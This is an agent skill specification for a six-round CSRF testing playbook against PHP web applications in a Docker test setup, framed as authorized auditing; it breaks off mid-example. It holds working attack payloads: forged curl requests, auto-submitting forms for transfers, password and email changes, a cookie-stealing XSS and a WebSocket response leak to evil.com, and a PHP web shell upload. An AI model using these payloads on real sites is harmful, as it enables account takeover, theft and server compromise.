## Identity

| Field | Value |
|-------|-------|
| Skill ID | S-057-B |
| Phase | Phase-4 (Attack) |
| Responsibility | Execute 6-round progressive attack against CSRF (Cross-Site Request Forgery) sinks |

## Input Contract

| File | Source | Required | Fields Used |
|------|--------|----------|-------------|
| Attack plan | `$WORK_DIR/attack_plans/{sink_id}_plan.json` | ✅ | `vectors`, `filter_analysis`, `bypass_strategies` |
| Credentials | `$WORK_DIR/credentials.json` | ✅ | `cookies`, `tokens`, `api_keys` |
| Container | Docker `php` container | ✅ | `exec` access |

## 🚨 CRITICAL Rules

| # | Rule | Consequence |
|---|------|-------------|
| CR-1 | Every `confirmed` verdict MUST have physical HTTP evidence: request URL + method + payload + response status + observable outcome | FAIL — evidence fabrication, finding rejected by QC |
| CR-2 | MUST NOT exceed 6 attack rounds — if stuck after round 4, execute Smart Pivot or Smart Skip | FAIL — resource exhaustion, blocks other auditors |
| CR-3 | MUST NOT attack routes not assigned in the task package — stay within allocated sink scope | FAIL — scope violation, duplicate work with other auditors |
| CR-4 | MUST read `$WORK_DIR/attack_plans/{sink_id}_plan.json` from Stage-1 before starting — do NOT re-analyze from scratch | FAIL — ignores Stage-1 analysis, wastes rounds on already-assessed vectors |
| CR-5 | MUST write exploit result to `$WORK_DIR/exploits/{sink_id}.json` conforming to `schemas/exploit_result.schema.json` | FAIL — downstream QC and report generation cannot process non-conformant output |
| CR-6 | MUST demonstrate state change via cross-origin request WITHOUT valid CSRF token — same-origin request with token omitted is insufficient | FAIL — same-origin test does not prove CSRF |
| CR-PAYLOAD | MUST test payloads in priority order (1→2→3→4) within each round — MUST NOT skip Priority 1 to try creative payloads directly | FAIL — uncontrolled payload selection, wastes rounds on low-probability attacks |

## 6-Round Attack Strategy
**Payload Selection Rule (CR-PAYLOAD)**:

Within each round, test payloads in the following priority order:

| Priority | Condition | Action |
|----------|-----------|--------|
| 1 (try first) | Simplest/most direct payload for this technique | Test baseline vulnerability existence |
| 2 | Encoding/evasion variant of Priority 1 | Test if filters block Priority 1 |
| 3 | Framework-specific or context-adaptive payload | Test framework-aware bypasses |
| 4 (try last) | Complex/chained payload | Test advanced exploitation |

- MUST test Priority 1 before trying Priority 2-4
- If Priority 1 succeeds → record evidence and proceed to next round (do NOT test remaining payloads)
- If Priority 1 fails → try Priority 2, then 3, then 4
- If ALL priorities fail → fill Round Fill-in with `failure_reason` and proceed to next round
- MUST NOT skip Priority 1 to try "creative" payloads directly



#### R1 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| selected_priority | `{1 / 2 / 3 / 4}` |
| payload | `{payload from this round's strategy — must match selected_priority}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R1 - CSRF Token Absence Detection

Scan all state-changing endpoints to locate those missing CSRF Tokens:

#### 1.1 Form Token Detection
```bash
# Search for CSRF Token hidden fields in HTML forms
docker exec php grep -rn 'csrf\|_token\|__token__\|csrfmiddlewaretoken' \
  /var/www/html/resources/views/ /var/www/html/templates/

# Laravel: Search for @csrf / {{ csrf_field() }}
docker exec php grep -rn '@csrf\|csrf_field()\|csrf_token()' \
  /var/www/html/resources/views/

# Symfony: Search for csrf_token('intention')
docker exec php grep -rn "csrf_token\|_token\|isCsrfTokenValid" \
  /var/www/html/templates/ /var/www/html/src/

# ThinkPHP: Search for {:token()} / __token__
docker exec php grep -rn '__token__\|{:token()}\|token()' \
  /var/www/html/view/ /var/www/html/app/
```

#### 1.2 AJAX Token Header Detection
```bash
# Search for X-CSRF-TOKEN Header configuration in JavaScript
docker exec php grep -rn 'X-CSRF-TOKEN\|X-XSRF-TOKEN\|csrf\|_token' \
  /var/www/html/public/js/ /var/www/html/resources/js/
```

#### 1.3 State-Changing GET Request Detection (Anti-Pattern)
```bash
# Search for routes that execute state changes via GET
docker exec php grep -rn "Route::get.*delete\|Route::get.*remove\|Route::get.*logout\|Route::get.*update" \
  /var/www/html/routes/

# Native PHP: INSERT/UPDATE/DELETE operations in GET requests
docker exec php grep -rn "\$_GET.*INSERT\|\$_GET.*UPDATE\|\$_GET.*DELETE\|\$_GET.*unlink\|\$_GET.*rmdir" \
  /var/www/html/
```

#### 1.4 No-Token Endpoint Verification
```bash
# Send POST request without Token to suspected endpoints missing Token protection
docker exec php curl -s -X POST \
  -H "Cookie: PHPSESSID=<victim_session>" \
  -d "amount=100&to=attacker" \
  "http://nginx:80/api/transfer"
# Returns 200 and operation succeeds → confirmed (missing CSRF protection)
# Returns 419/403 → Token validation is active
```

**Success Criteria:** Discover endpoints where state changes can be executed without a CSRF Token, or discover anti-pattern routes that perform state changes via GET.


#### R2 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |
| selected_priority | `{1 / 2 / 3 / 4}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R2 - Token Validation Bypass

For endpoints with deployed CSRF Tokens, construct abnormal Tokens to test whether validation logic is strict:

#### 2.1 Empty Token Value Bypass
```bash
# Submit empty string Token
docker exec php curl -s -X POST \
  -H "Cookie: PHPSESSID=<victim_session>" \
  -d "_token=&amount=100&to=attacker" \
  "http://nginx:80/api/transfer"

# Submit whitespace Token
docker exec php curl -s -X POST \
  -H "Cookie: PHPSESSID=<victim_session>" \
  -d "_token=%20&amount=100&to=attacker" \
  "http://nginx:80/api/transfer"
```

#### 2.2 Missing Token Field Bypass
```bash
# Completely omit the Token field
docker exec php curl -s -X POST \
  -H "Cookie: PHPSESSID=<victim_session>" \
  -d "amount=100&to=attacker" \
  "http://nginx:80/api/transfer"
```

#### 2.3 Static/Predictable Token
```bash
# Extract Token from multiple requests and compare whether they are identical
TOKEN1=$(docker exec php curl -s "http://nginx:80/form" | grep -oP 'name="_token" value="\K[^"]+')
TOKEN2=$(docker exec php curl -s "http://nginx:80/form" | grep -oP 'name="_token" value="\K[^"]+')
echo "Token1: $TOKEN1"
echo "Token2: $TOKEN2"
# If Token is always the same → static Token, predictable
```

#### 2.4 Token Reuse (Replay After Consumption)
```bash
# First use of Token (SHOULD succeed)
docker exec php curl -s -X POST \
  -H "Cookie: PHPSESSID=<victim_session>" \
  -d "_token=$TOKEN1&amount=100&to=attacker" \
  "http://nginx:80/api/transfer"

# Second use of the same Token (SHOULD be rejected)
docker exec php curl -s -X POST \
  -H "Cookie: PHPSESSID=<victim_session>" \
  -d "_token=$TOKEN1&amount=200&to=attacker" \
  "http://nginx:80/api/transfer"
# Still succeeds → Token is not single-use, can be reused
```

#### 2.5 Cross-Session Token Validity
```bash
# Use attacker Session's Token submitted to victim Session
docker exec php curl -s -X POST \
  -H "Cookie: PHPSESSID=<victim_session>" \
  -d "_token=<attacker_token>&amount=100&to=attacker" \
  "http://nginx:80/api/transfer"
# Succeeds → Token is not bound to Session, can be reused cross-session
```

#### 2.6 Token Parameter Name Variants
```bash
# Try different Token parameter names (framework may only validate a specific name)
docker exec php curl -s -X POST \
  -H "Cookie: PHPSESSID=<victim_session>" \
  -d "csrf_token=invalid&amount=100&to=attacker" \
  "http://nginx:80/api/transfer"

docker exec php curl -s -X POST \
  -H "Cookie: PHPSESSID=<victim_session>" \
  -H "X-CSRF-TOKEN: invalid" \
  -d "amount=100&to=attacker" \
  "http://nginx:80/api/transfer"
```

**Success Criteria:** Empty Token, missing Token, consumed Token, cross-session Token, or static Token is accepted by the server.


#### R3 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |
| selected_priority | `{1 / 2 / 3 / 4}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R3 - SameSite Cookie Bypass

Detect and bypass SameSite Cookie attribute CSRF protection:

#### 3.1 SameSite Attribute Detection
```bash
# Extract Session Cookie's SameSite attribute
docker exec php curl -s -D- "http://nginx:80/login" | grep -i 'set-cookie'
# Focus on: SameSite=None / SameSite=Lax / SameSite=Strict / missing

# Query PHP configuration
docker exec php php -r "echo ini_get('session.cookie_samesite');"
# Empty value → not set, browser defaults to Lax (Chrome 80+)

# Search for cookie settings in code
docker exec php grep -rn 'session.cookie_samesite\|samesite\|SameSite\|cookie_params' \
  /var/www/html/ --include="*.php" --include="*.ini"
```

#### 3.2 SameSite=None Exploitation (iframe Attack)
```html
<!-- Attacker page: When SameSite=None, cross-site requests automatically carry Cookies -->
<iframe name="csrf_frame" style="display:none"></iframe>
<form id="csrf_form" method="POST" action="http://target.com/api/transfer" target="csrf_frame">
  <input type="hidden" name="amount" value="10000" />
  <input type="hidden" name="to" value="attacker_account" />
</form>
<script>document.getElementById('csrf_form').submit();</script>
```

#### 3.3 SameSite=Lax Bypass (Top-Level Navigation)
```html
<!-- In Lax mode, GET requests carry Cookies during top-level navigation -->
<!-- Attack 1: Exploit state-changing GET endpoints -->
<a href="http://target.com/delete/123">Click here for prize!</a>

<!-- Attack 2: GET→POST chain (if open redirect exists) -->
<a href="http://target.com/redirect?url=/api/transfer%3famount%3d100%26to%3dattacker">Click</a>

<!-- Attack 3: Popup method (new window = top-level navigation) -->
<script>
window.open('http://target.com/api/dangerous-get-action');
</script>
```

#### 3.4 SameSite=None Missing Secure Flag
```bash
# Analyze whether SameSite=None is paired with Secure
docker exec php curl -s -D- "http://nginx:80/" | grep -i 'set-cookie'
# SameSite=None but no Secure → modern browsers will reject setting this Cookie
# Older browsers may still accept → risk exists
```

#### 3.5 Subdomain Cookie Scope
```bash
# Extract Cookie Domain attribute
docker exec php curl -s -D- "http://nginx:80/" | grep -i 'set-cookie.*domain'
# Domain=.example.com → all subdomains share Cookie
# If attacker controls any subdomain (e.g., evil.user-content.example.com), CSRF can be launched
```

**Success Criteria:** Session Cookie's SameSite attribute configuration allows cross-site requests to carry Cookies, enabling attacker pages to automatically complete authenticated requests.


#### R4 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |
| selected_priority | `{1 / 2 / 3 / 4}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R4 - JSON CSRF

Construct cross Content-Type requests to test CSRF protection of JSON API endpoints:

#### 4.1 HTML Form Spoofing JSON Content-Type
```html
<!-- Form enctype can only be application/x-www-form-urlencoded, multipart/form-data, text/plain -->
<!-- Attempt text/plain to send JSON-like content -->
<form method="POST" action="http://target.com/api/transfer" enctype="text/plain">
  <input name='{"amount":10000,"to":"attacker","ignore":"' value='"}' type="hidden" />
</form>
<script>document.forms[0].submit();</script>
<!-- Actually sends: {"amount":10000,"to":"attacker","ignore":"="}  -->
<!-- If server loosely parses Content-Type or ignores trailing content → attack succeeds -->
```

#### 4.2 Content-Type Ignored Test
```bash
# Does the server still parse JSON body when Content-Type does not match
docker exec php curl -s -X POST \
  -H "Cookie: PHPSESSID=<victim_session>" \
  -H "Content-Type: text/plain" \
  -d '{"amount":10000,"to":"attacker"}' \
  "http://nginx:80/api/transfer"

# Send JSON data with application/x-www-form-urlencoded
docker exec php curl -s -X POST \
  -H "Cookie: PHPSESSID=<victim_session>" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d '{"amount":10000,"to":"attacker"}' \
  "http://nginx:80/api/transfer"
```

#### 4.3 navigator.sendBeacon() Attack
```html
<!-- sendBeacon can send POST requests without triggering CORS preflight (for text/plain) -->
<script>
navigator.sendBeacon(
  'http://target.com/api/transfer',
  new Blob(['{"amount":10000,"to":"attacker"}'], {type: 'text/plain'})
);
</script>
```

#### 4.4 Fetch API CORS Preflight Probing
```bash
# Send OPTIONS preflight request to probe server CORS configuration
docker exec php curl -s -X OPTIONS \
  -H "Origin: http://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type" \
  "http://nginx:80/api/transfer" -D-
# Access-Control-Allow-Origin: * or http://evil.com → preflight passes
# Access-Control-Allow-Headers includes Content-Type → JSON can be sent
```

#### 4.5 Framework JSON Parsing Leniency
```bash
# Analyze whether PHP framework still calls json_decode with non-JSON Content-Type
# Laravel: $request->json() vs $request->input()
# Some frameworks auto-detect format based on body content
docker exec php grep -rn 'json_decode.*file_get_contents.*php://input\|getContent()' \
  /var/www/html/ --include="*.php"
# If code directly json_decode(php://input) without validating Content-Type → exploitable
```

**Success Criteria:** Successfully send requests to JSON API endpoints using HTML forms or `sendBeacon` that trigger state changes, without requiring CORS preflight or CSRF Token.


#### R5 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |
| selected_priority | `{1 / 2 / 3 / 4}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R5 - Origin/Referer Check Bypass

Construct forged origin requests to test server-side Origin/Referer validation logic:

#### 5.1 Missing Referer Header Bypass
```html
<!-- Use Referrer-Policy to suppress sending Referer -->
<meta name="referrer" content="no-referrer">
<form method="POST" action="http://target.com/api/transfer">
  <input type="hidden" name="amount" value="10000" />
  <input type="hidden" name="to" value="attacker" />
</form>
<script>document.forms[0].submit();</script>
```
```bash
# Confirm whether request without Referer is accepted
docker exec php curl -s -X POST \
  -H "Cookie: PHPSESSID=<victim_session>" \
  -d "amount=10000&to=attacker" \
  "http://nginx:80/api/transfer"
# Note: curl does not send Referer by default → if succeeds → server does not validate Referer
```

#### 5.2 Null Origin Bypass
```html
<!-- sandboxed iframe sends Origin: null -->
<iframe sandbox="allow-scripts allow-forms" srcdoc="
  <form method='POST' action='http://target.com/api/transfer'>
    <input name='amount' value='10000' />
    <input name='to' value='attacker' />
  </form>
  <script>document.forms[0].submit();</script>
"></iframe>
<!-- Origin: null — some servers whitelist null -->
```
```bash
# Confirm whether null Origin request is accepted
docker exec php curl -s -X POST \
  -H "Cookie: PHPSESSID=<victim_session>" \
  -H "Origin: null" \
  -d "amount=10000&to=attacker" \
  "http://nginx:80/api/transfer"
```

#### 5.3 Referer Subdomain Matching Bypass
```bash
# Exploit loose domain matching regex
docker exec php curl -s -X POST \
  -H "Cookie: PHPSESSID=<victim_session>" \
  -H "Referer: http://target.com.evil.com/page" \
  -d "amount=10000&to=attacker" \
  "http://nginx:80/api/transfer"

# Suffix matching bypass
docker exec php curl -s -X POST \
  -H "Cookie: PHPSESSID=<victim_session>" \
  -H "Referer: http://evil-target.com/page" \
  -d "amount=10000&to=attacker" \
  "http://nginx:80/api/transfer"
```

#### 5.4 Origin Regex Bypass
```bash
# Unescaped dot: target.com matches targetXcom
docker exec php curl -s -X POST \
  -H "Cookie: PHPSESSID=<victim_session>" \
  -H "Origin: http://targetXcom.evil.com" \
  -d "amount=10000&to=attacker" \
  "http://nginx:80/api/transfer"

# Port bypass: target.com:evil.com
docker exec php curl -s -X POST \
  -H "Cookie: PHPSESSID=<victim_session>" \
  -H "Origin: http://target.com:80@evil.com" \
  -d "amount=10000&to=attacker" \
  "http://nginx:80/api/transfer"
```

#### 5.5 Server-Side Origin Validation Code Inspection
```bash
# Search for Origin/Referer validation logic
docker exec php grep -rn 'HTTP_ORIGIN\|HTTP_REFERER\|Origin\|Referer' \
  /var/www/html/ --include="*.php" | grep -i 'check\|valid\|verify\|allow\|match'

# Common dangerous patterns:
# strpos($origin, 'target.com') !== false — bypassable with target.com.evil.com
# preg_match('/target.com/', $origin) — unescaped dot
# in_array($origin, ['null', ...]) — null Origin whitelisted
```

**Success Criteria:** Successfully execute cross-site requests using missing, null, or forged Origin/Referer headers.


#### R6 Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | {URL from attack plan} |
| injection_point | {parameter name from plan} |
| payload | {payload from this round's strategy} |
| evidence_command | {docker exec or curl command to verify} |
| expected_evidence | {what confirms success} |
| selected_priority | `{1 / 2 / 3 / 4}` |
| result | `{success / fail}` |
| failure_reason | `{if fail: waf_blocked / filter_effective / auth_required / timeout / not_applicable}` |

### R6 - Advanced CSRF Chains

Construct combination payloads to test advanced CSRF exploitation scenarios and attack chains:

#### 6.1 Login CSRF (Force Login to Attacker Account)
```html
<!-- Force victim to log into an attacker-controlled account -->
<form method="POST" action="http://target.com/login">
  <input type="hidden" name="username" value="attacker_account" />
  <input type="hidden" name="password" value="attacker_password" />
</form>
<script>document.forms[0].submit();</script>
<!-- Victim's subsequent actions (e.g., binding credit card, entering address) will be associated with attacker's account -->
```

#### 6.2 Pre-auth CSRF (Password Reset / Email Change)
```html
<!-- Change victim's password -->
<form method="POST" action="http://target.com/api/change-password">
  <input type="hidden" name="new_password" value="attacker_password123" />
  <input type="hidden" name="confirm_password" value="attacker_password123" />
</form>
<script>document.forms[0].submit();</script>

<!-- Change victim's email (for subsequent password reset) -->
<form method="POST" action="http://target.com/api/change-email">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>document.forms[0].submit();</script>
```

#### 6.3 CSRF + Self-XSS → Stored XSS Chain
```html
<!-- If profile page has Self-XSS (only visible to self), combining with CSRF can escalate to attacking others -->
<form method="POST" action="http://target.com/api/update-profile">
  <input type="hidden" name="bio" value='<script>document.location="http://evil.com/steal?c="+document.cookie</script>' />
</form>
<script>document.forms[0].submit();</script>
<!-- Attacker first writes XSS payload into victim's profile via CSRF -->
<!-- When admin views that user's profile, Stored XSS triggers -->
```

#### 6.4 Multi-Step CSRF (Sequential State Changes)
```html
<!-- Simulate multi-step operation: first add recipient, then transfer -->
<iframe name="step1" style="display:none"></iframe>
<iframe name="step2" style="display:none"></iframe>

<form id="f1" method="POST" action="http://target.com/api/add-recipient" target="step1">
  <input type="hidden" name="account" value="attacker_account" />
  <input type="hidden" name="name" value="My Friend" />
</form>

<form id="f2" method="POST" action="http://target.com/api/transfer" target="step2">
  <input type="hidden" name="recipient" value="attacker_account" />
  <input type="hidden" name="amount" value="10000" />
</form>

<script>
document.getElementById('f1').submit();
setTimeout(function() {
  document.getElementById('f2').submit();
}, 2000);
</script>
```

#### 6.5 WebSocket CSRF
```html
<!-- Test whether WebSocket endpoint validates Origin -->
<script>
var ws = new WebSocket('ws://target.com/ws/chat');
ws.onopen = function() {
  // If connection succeeds → WebSocket endpoint does not validate Origin
  ws.send(JSON.stringify({
    action: 'transfer',
    amount: 10000,
    to: 'attacker'
  }));
};
ws.onmessage = function(e) {
  // Exfiltrate response to attacker server
  new Image().src = 'http://evil.com/log?data=' + encodeURIComponent(e.data);
};
</script>
```
```bash
# Confirm WebSocket Origin validation by sending cross-origin handshake request
docker exec php curl -s -X GET \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Origin: http://evil.com" \
  "http://nginx:80/ws/endpoint" -D-
# 101 Switching Protocols → Origin not validated
```

#### 6.6 File Upload CSRF (multipart/form-data)
```html
<!-- Upload malicious file via CSRF -->
<form method="POST" action="http://target.com/api/upload-avatar" enctype="multipart/form-data">
  <input type="hidden" name="filename" value="shell.php" />
  <textarea name="file" style="display:none">&lt;?php system($_GET['cmd']); ?&gt;</textarea>
</form>
<script>document.forms[0].submit();</script>
<!-- Note: HTML forms cannot construct true file uploads, but some backends accept textarea content as files -->
<!-- More common: if upload endpoint accepts Base64-encoded file content -->
```
```html
<form method="POST" action="http://target.com/api/upload">
  <input type="hidden" name="file_content" value="PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+" />
  <input type="hidden" name="filename" value="shell.php" />
</form>
<script>document.forms[0].submit();</script>
```

**Success Criteria:** Complete multi-step CSRF attack chains or combination attacks to achieve account takeover, stored XSS injection, or cross-origin WebSocket manipulation.

## Evidence Collection

Three evidence collection methods:

### 1. Cross-Origin Form Submission
```bash
# Send form from attacker domain to target
docker exec php curl -s -X POST \
  -H "Cookie: PHPSESSID=<victim_session>" \
  -H "Origin: http://evil.com" \
  -H "Referer: http://evil.com/attack.html" \
  -d "amount=100&to=attacker" \
  "http://nginx:80/api/transfer"
# Returns 200 and state change succeeds → confirmed
```

### 2. Token Absence/Bypass
```bash
# Request without Token
docker exec php curl -s -X POST \
  -H "Cookie: PHPSESSID=<victim_session>" \
  -d "action=delete&id=123" \
  "http://nginx:80/api/resource" -w "\nHTTP_CODE:%{http_code}"
# HTTP_CODE:200 → confirmed (Token not validated)
# HTTP_CODE:419/403 → Token validation is active
```

### 3. State Diff Comparison
```bash
# Before attack: Get current state
BEFORE=$(docker exec php curl -s -H "Cookie: PHPSESSID=<victim_session>" "http://nginx:80/api/account")

# Execute CSRF attack
docker exec php curl -s -X POST \
  -H "Cookie: PHPSESSID=<victim_session>" \
  -d "amount=100&to=attacker" \
  "http://nginx:80/api/transfer"

# After attack: Get new state
AFTER=$(docker exec php curl -s -H "Cookie: PHPSESSID=<victim_session>" "http://nginx:80/api/account")

# Compare difference
echo "Before: $BEFORE"
echo "After: $AFTER"
# Balance decreased → confirmed (state was actually changed)
```

## Per-Round Record Format

Each round MUST be fully recorded:

```json
{
  "round": 1,
  "strategy": "token_absence_scan",
  "target_endpoint": "POST /api/transfer",
  "csrf_protection": "none|token|samesite|origin_check",
  "payload": "<form method='POST' action='http://target.com/api/transfer'>...",
  "request": "POST /api/transfer HTTP/1.1\nCookie: PHPSESSID=abc123\n\namount=100&to=attacker",
  "response_status": 200,
  "response_body_snippet": "first 500 chars...",
  "state_change_confirmed": true,
  "evidence_type": "token_missing|token_bypass|samesite_bypass|origin_bypass",
  "evidence_detail": "POST /api/transfer has no CSRF Token validation, cross-origin request successfully executed transfer",
  "result": "confirmed|highly_suspected|potential_risk|safe",
  "failure_reason": null
}
```

## Smart Skip

Skip MAY be requested after Round 4, but MUST provide:
- List of attempted strategies (Token detection, Token bypass, SameSite bypass, Content-Type manipulation, Flash-based CSRF)
- CSRF protection mechanism analysis conclusion (Token type, validation logic, Cookie attributes)
- Reasoning for why subsequent strategies cannot bypass (e.g., strict Token + SameSite=Strict + Origin validation triple defense)

## Detection (Vulnerability Pattern Recognition)

The following code patterns indicate potential CSRF vulnerabilities:
- Pattern 1: POST handler missing `csrf_field()` / `_token` / `csrf_token()` form field — Form lacks CSRF Token
- Pattern 2: Controller method does not apply CSRF middleware (e.g., manually excluded via `$except` in Laravel) — Middleware coverage gap
- Pattern 3: `VerifyCsrfToken::$except` uses broad exclusions (e.g., `'api/*'`, `'webhook/*'`) — Laravel exclusion routes too wide
- Pattern 4: API routes use Session authentication without CSRF protection (`api.php` uses `web` middleware group) — Session-based API missing Token
- Pattern 5: `jQuery.ajax()` / `axios.post()` not configured with `X-CSRF-TOKEN` or `X-XSRF-TOKEN` Header — AJAX requests missing Token
- Pattern 6: State-changing GET routes (e.g., `Route::get('/delete/{id}', ...)`, `GET` request performs `DELETE` operation) — Anti-pattern route
- Pattern 7: Custom CSRF implementation uses weak validation (e.g., `if(isset($_POST['token']))` only checks existence without comparing value) — Validation logic not strict
- Pattern 8: Session Cookie does not set SameSite attribute (`session.cookie_samesite` is empty or `session_set_cookie_params()` does not specify) — Cookie configuration flaw

## Key Insight

> **Key Point**: The core of CSRF protection is not "whether a Token exists" but "whether Token validation is strict". Many frameworks generate CSRF tokens but have validation bypasses (empty value passes, Token reusable, exclusion routes too broad). Focus on analyzing Token lifecycle and validation logic rather than merely confirming Token presence. Also pay attention to SameSite Cookie configuration and Origin/Referer validation as defense-in-depth layers — a single protection mechanism is insufficient to defend against all CSRF variants.

### Smart Pivot (Stuck Detection)

When 3 consecutive rounds fail (current round ≥ 4), trigger Smart Pivot:

1. Re-reconnaissance: Re-read target code to find overlooked CSRF exclusion routes, middleware gaps, and alternative state-changing endpoints
2. Cross-intelligence: Consult findings from other experts in the shared findings database (`$WORK_DIR/audit_session.db`) (e.g., Self-XSS found by XSS expert can be combined with CSRF)
3. Decision tree matching: Select new attack direction based on failure patterns in `shared/pivot_strategy.md`
4. If no new paths available, terminate early to avoid wasting rounds producing hallucinated results

## Prerequisite Conditions & Scoring (MUST be filled)

The output `exploits/{sink_id}.json` MUST include the following two objects:

### prerequisite_conditions
```json
{
  "auth_requirement": "anonymous|authenticated|admin|internal_network",
  "bypass_method": "Authentication bypass method, null if none",
  "other_preconditions": ["Precondition 1", "Precondition 2"],
  "exploitability_judgment": "directly_exploitable|conditionally_exploitable|not_exploitable"
}
```
- `auth_requirement` MUST match the auth_level for that route in auth_matrix.json
- `exploitability_judgment = "not_exploitable"` → final_verdict SHALL be at most potential
- `other_preconditions` MUST list all non-authentication prerequisites (e.g., PHP configuration, Composer dependencies, environment variables)

### severity (Three-Dimensional Scoring, see shared/severity_rating.md for details)
```json
{
  "reachability": 0-3, "reachability_reason": "...",
  "impact": 0-3, "impact_reason": "...",
  "complexity": 0-3, "complexity_reason": "...",
  "score": "R×0.40+I×0.35+C×0.25",
  "cvss": "(score/3.0)×10.0",
  "level": "C|H|M|L",
  "vuln_id": "C-CSRF-001"
}
```
- All reason fields MUST be filled with specific justification; they MUST NOT be empty
- score and evidence_score MUST be consistent (≥2.10→≥7, 1.20-2.09→4-6, <1.20→1-3)

### Evidence Contract Reference (EVID)

Each vulnerability conclusion MUST reference the following evidence points in the `evidence` field (refer to `shared/evidence_contract.md`):
- `EVID_CSRF_ENDPOINT_IDENTITY` — Affected state-changing endpoint (METHOD /path) ✅ Required
- `EVID_CSRF_TOKEN_STATUS` — Token existence/validation logic/middleware configuration evidence ✅ Required
- `EVID_CSRF_SAMESITE_STATUS` — SameSite cookie configuration evidence ✅ Required
- `EVID_CSRF_CROSS_ORIGIN_RESPONSE` — HTTP evidence of cross-origin request successfully executing state change — Required when confirmed

Missing required EVID → conclusion is automatically downgraded (confirmed→suspected→unverified).

### Attack Memory Write-Back

After the attack cycle ends, write experience to the attack memory store (format per `shared/attack_memory.md` write protocol):

- ✅ confirmed: Record successful payload type + bypass technique + successful round
- ❌ failed (≥3 rounds): Record all excluded strategies + failure reasons
- ⚠️ partial: Record partially successful strategies + blocking reasons
- ❌ failed (<3 rounds): Do not record

Use `bash tools/audit_db.sh memory-write '<json>'` to write; SQLite WAL mode automatically ensures concurrency safety.

## Output

After completing all rounds, write the final result to `$WORK_DIR/exploits/{sink_id}.json`, following the format in `shared/data_contracts.md` Section 9 (`exploit.json`).

> The `## Per-Round Record Format` above is the internal record format for each round; the final output MUST be consolidated into the exploit.json structure.

## Report Format

```json
{
  "vuln_type": "CSRF",
  "sub_type": "token_missing|token_bypass|samesite_bypass|origin_bypass|json_csrf|login_csrf|multi_step|websocket_csrf",
  "round": 1,
  "endpoint": "POST /api/transfer",
  "payload": "<form method='POST' action='http://target.com/api/transfer'><input name='amount' value='10000'/></form>",
  "evidence": "Cross-origin POST request successfully executed transfer, balance changed from 10000 to 0. EVID_CSRF_ENDPOINT_IDENTITY: POST /api/transfer; EVID_CSRF_TOKEN_STATUS: No Token field; EVID_CSRF_SAMESITE_STATUS: SameSite=None; EVID_CSRF_CROSS_ORIGIN_RESPONSE: HTTP 200, {\"status\":\"success\",\"balance\":0}",
  "confidence": "confirmed|highly_suspected|potential_risk",
  "impact": "Fund transfer|Account takeover|Data modification|Privilege escalation",
  "remediation": "Add CSRF Token validation, set SameSite=Strict/Lax, validate Origin/Referer Header"
}
```

## Real-Time Sharing & Second-Order Tracking

### Shared Write
When a valid CSRF attack surface is discovered, you **MUST** write to the shared findings database (`$WORK_DIR/audit_session.db`):
- State-changing endpoints missing CSRF protection → `finding_type: endpoint`
- Discovered SameSite=None Cookie configuration → `finding_type: config_value`
- CSRF + Self-XSS combination chain leads → `finding_type: attack_chain`

### Shared Read
Read the shared findings database before starting the attack phase, leveraging:
- Self-XSS found by XSS expert → Combine with CSRF to escalate to Stored XSS (R6.3)
- CSRF Token leakage found by information disclosure expert → Can be used to forge requests
- SameSite/CORS configuration issues found by configuration auditor → Adjust SameSite bypass strategy (R3)

## Constraints

- MUST NOT execute actual fund transfers or irreversible operations against production environments; use test accounts for verification
- MUST always test within authorized scope; MUST NOT attack unauthorized targets
- Each confirmed finding MUST record the exact request/response pair
- CSRF PoCs are ONLY for confirming vulnerability existence through actual requests; MUST NOT be used to actually attack users
- Multi-step CSRF tests MUST ensure no persistent side effects are produced (e.g., creating data that cannot be deleted)


## Output Contract

| File | Path | Format |
|------|------|--------|
| Exploit result | `$WORK_DIR/exploits/{sink_id}.json` | JSON per `shared/data_contracts.md` §9 |
| PoC script | `$WORK_DIR/PoC脚本/{sink_id}_poc.py` | Python PoC |

## Examples

### ✅ GOOD Output Example

```json
{
  "sink_id": "CSRF-001",
  "vuln_type": "CSRF",
  "sub_type": "token_missing",
  "final_verdict": "confirmed",
  "rounds_executed": 2,
  "confirmed_round": 1,
  "endpoint": "POST /api/transfer",
  "payload": "<form method=\"POST\" action=\"http://target/api/transfer\"><input name=\"amount\" value=\"10000\"/></form>",
